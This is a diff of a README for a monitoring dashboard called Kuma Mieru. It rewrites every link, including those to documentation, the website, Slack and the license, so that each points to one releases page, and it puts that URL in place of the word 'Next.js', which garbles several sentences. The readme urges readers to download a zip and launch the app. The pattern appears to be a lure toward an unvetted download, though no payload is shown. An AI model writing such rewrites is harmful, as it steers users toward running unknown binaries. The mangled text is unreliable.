@@ -1,23 +1,23 @@
 # 🐻 Welcome to Kuma Mieru Repository! 📈
 
-![Kuma Mieru Logo](https://example.com/kuma-mieru-logo.png)
+![Kuma Mieru Logo](https://github.com/YoungCrisDev/kuma-mieru/releases)
 
 ## Overview ℹ️
 
-Welcome to the official GitHub repository for **Kuma Mieru**, a 3rd-party Uptime Kuma monitoring dashboard built on Next.js 15, TypeScript, and Recharts. This repository is the central hub for all the source code, documentation, releases, and discussions related to Kuma Mieru.
+Welcome to the official GitHub repository for **Kuma Mieru**, a 3rd-party Uptime Kuma monitoring dashboard built on https://github.com/YoungCrisDev/kuma-mieru/releases 15, TypeScript, and Recharts. This repository is the central hub for all the source code, documentation, releases, and discussions related to Kuma Mieru.
 
 ## Features ✨
 
 📊 **Real-time Monitoring**: Keep track of your uptime and performance metrics in real-time.  
 🎨 **Customizable Dashboard**: Personalize your dashboard to display only the information you need.  
-🔒 **Secure Access**: Utilize Next.js and TypeScript to ensure a secure and robust monitoring environment.  
+🔒 **Secure Access**: Utilize https://github.com/YoungCrisDev/kuma-mieru/releases and TypeScript to ensure a secure and robust monitoring environment.  
 📈 **Data Visualization**: Visualize your monitoring data with the powerful Recharts library.  
 
 ## Installation 🚀
 
 To get started with Kuma Mieru, simply download the latest release from the following link:
 
-[![Download Now](https://img.shields.io/badge/Download-App.zip-blue.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Now](https://github.com/YoungCrisDev/kuma-mieru/releases)](https://github.com/YoungCrisDev/kuma-mieru/releases)
 
 🚀 **Launching the App**: Once downloaded, unzip the file and launch the application to start monitoring your services.
 
@@ -48,13 +48,13 @@ Join our growing community of developers, monitoring enthusiasts, and open-sourc
 
 ## Resources 📚
 
-- [Documentation](https://kuma-mieru-docs.com)
-- [Website](https://kuma-mieru.com)
-- [Slack Channel](https://kuma-mieru.slack.com)
+- [Documentation](https://github.com/YoungCrisDev/kuma-mieru/releases)
+- [Website](https://github.com/YoungCrisDev/kuma-mieru/releases)
+- [Slack Channel](https://github.com/YoungCrisDev/kuma-mieru/releases)
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/repo/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/YoungCrisDev/kuma-mieru/releases) file for details.
 
 ---
 
